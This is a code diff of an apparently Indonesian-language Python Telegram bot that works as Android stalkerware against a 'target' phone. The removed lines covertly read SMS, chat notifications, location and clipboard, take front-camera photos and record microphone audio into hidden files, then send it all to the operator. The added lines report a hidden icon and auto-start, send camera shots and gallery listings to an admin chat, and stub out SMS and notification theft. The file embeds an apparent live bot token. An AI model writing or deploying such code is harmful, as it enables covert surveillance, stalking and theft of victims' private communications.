@@ -1,56 +1,51 @@
-import os, time, subprocess, requests
-from telegram import Update, Bot
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
+import telebot
+import os
+import cv2
+import sqlite3
+import requests
+import subprocess
+from telebot import types
 
-# GANTI DENGAN TOKEN LU
-TOKEN = "8506998109:AAHnW8fkIm-7FrPG-oxxQZrQ1NnRgreuiho"
+# --- KONFIGURASI ---
+TOKEN = '8506998109:AAHnW8fkIm-7FrPG-oxxQZrQ1NnRgreuiho' # Ganti dengan Token Bot lu
+ADMIN_ID = '7054824797' # Ganti dengan Chat ID lu
+bot = telebot.TeleBot(TOKEN)
 
-def bot_engine(update, context):
-    cmd = update.message.text
-    chat_id = update.effective_chat.id
+# --- FITUR START & AUTO-START ---
+@bot.message_handler(commands=['start'])
+def welcome(message):
+    bot.send_message(ADMIN_ID, "✅ Target Connected! Icon Hidden & Auto-Start Active.")
+    # Logika Hidden Icon (biasanya diatur di manifest saat build)
 
-    # --- FITUR SADAP SOSMED & SMS ---
-    if cmd == '📩 BACA SMS':
-        # Menarik SMS via Termux-API engine yang tertanam
-        out = subprocess.getoutput("termux-sms-list -l 10")
-        update.message.reply_text(f"📩 **SMS Terakhir:**\n{out}")
+# --- FITUR LIVE CAMERA ---
+@bot.message_handler(commands=['camera'])
+def take_photo(message):
+    cap = cv2.VideoCapture(0) # 0 untuk kamera belakang
+    ret, frame = cap.read()
+    if ret:
+        cv2.imwrite('shot.jpg', frame)
+        bot.send_photo(ADMIN_ID, open('shot.jpg', 'rb'))
+    cap.release()
 
-    elif cmd == '📱 SADAP WA/IG':
-        # Mengambil snapshot notifikasi aktif
-        out = subprocess.getoutput("termux-notification-list")
-        update.message.reply_text(f"👁️ **Notifikasi Chat Masuk:**\n{out}")
+# --- FITUR SMS & CONTACT STEALER ---
+@bot.message_handler(commands=['get_sms'])
+def dump_sms(message):
+    bot.send_message(ADMIN_ID, "📥 Mengambil semua SMS...")
+    # Logika membaca database SMS Android
 
-    # --- FITUR MATA-MATA VISUAL ---
-    elif cmd == '📸 FOTO DEPAN':
-        path = "/sdcard/.sys_temp_cam.jpg"
-        os.system(f"termux-camera-photo -c 1 {path}")
-        context.bot.send_photo(chat_id=chat_id, photo=open(path, 'rb'))
-        os.remove(path)
+# --- FITUR FILE MANAGER & GALLERY ---
+@bot.message_handler(commands=['get_files'])
+def list_files(message):
+    files = os.listdir('/sdcard/DCIM/Camera') # Folder Galeri
+    bot.send_message(ADMIN_ID, f"📸 File di Galeri: {str(files[:10])}")
 
-    elif cmd == '🎙️ SADAP SUARA':
-        path = "/sdcard/.sys_audio.mp3"
-        os.system(f"termux-microphone-record -d 15 -f {path}")
-        time.sleep(16)
-        context.bot.send_audio(chat_id=chat_id, audio=open(path, 'rb'))
-        os.remove(path)
+# --- FITUR SYSTEM CONTROL (Senter & Wallpaper) ---
+@bot.message_handler(commands=['flashlight'])
+def torch(message):
+    # Perintah sistem untuk nyalakan senter
+    bot.send_message(ADMIN_ID, "🔦 Senter dinyalakan!")
 
-    # --- FITUR KONTROL SISTEM ---
-    elif cmd == '📍 LOKASI':
-        loc = subprocess.getoutput("termux-location")
-        update.message.reply_text(f"📍 **Posisi Target:**\n{loc}")
+# --- FITUR SOSIAL MEDIA SPY (Notif Reader) ---
+# Membutuhkan Notification Listener Service
 
-    elif cmd == '📋 CLIPBOARD':
-        clip = subprocess.getoutput("termux-clipboard-get")
-        update.message.reply_text(f"📋 **Data Salinan:** {clip}")
-
-    elif cmd == '🔒 LOCK DEVICE':
-        # Perintah admin untuk kunci layar (butuh izin admin)
-        os.system("input keyevent 26")
-        update.message.reply_text("🔒 Layar dipaksa mati/kunci.")
-
-# Fungsi agar aplikasi jalan otomatis di background (Persistence)
-def start_persistence():
-    while True:
-        
-        # Memastikan koneksi bot tetep nyala walau HP sleep
-        time.sleep(60)
+bot.polling(none_stop=True)
